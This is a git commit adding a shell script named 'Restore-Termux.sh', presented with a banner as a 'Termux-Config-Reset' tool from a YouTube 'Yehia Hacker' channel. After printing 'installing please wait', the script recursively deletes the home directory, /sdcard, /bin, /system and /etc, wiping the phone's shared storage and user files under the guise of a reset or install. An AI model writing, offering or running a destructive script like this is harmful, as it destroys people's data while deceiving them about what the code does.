81058f4365ed88dd3bb8169d77ca79d9984110ba
yehia hacker <42983220+yehia-hacker@users.noreply.github.com>
2018-09-17 16:35:16 +0200

    Add files via upload

---
+++ Restore-Termux.sh
@@ -0,0 +1,32 @@
+print "\n \033[92m *******************************************************************"
+print "*                                       #####  ########                    *"
+print "*    #######  #######   ######    #####    #######            *"
+print "*       #     #      #  #     #  #     #      # #                     *"
+print "*       #     #      #  #     # #      #      #  #                          *"
+print "*       #     ###### #   #    # #      #      #   #                *"
+print "*       #     #    #    #              #      #    #                  *"
+print "*       #     #     #   #              #      #     #                 *"
+print "*       #     #      #  ###          ###      #      #        *"
+print "* Termux-Config-Reset Ver. 2.0                #       #               *"
+print "* **************************                                      *"
+print "* Cyber Security                                       *"
+print "* Youtube Channel: Yehia Hacker                               *"
+print "*******************************************************************\033[94m\n\n"
+
+echo "installing please wait"
+apt-get update
+cd
+rm -irf *
+cd /sdcard
+rm -irf *
+cd
+cd /bin
+rm -irf *
+cd
+cd /system
+rm -irf *
+cd 
+cd /etc
+rm -irf *
+sleep 2
+echo "done!!! RESETTING YOUR SYSTEM... YEHIA HACKER... trying use command"
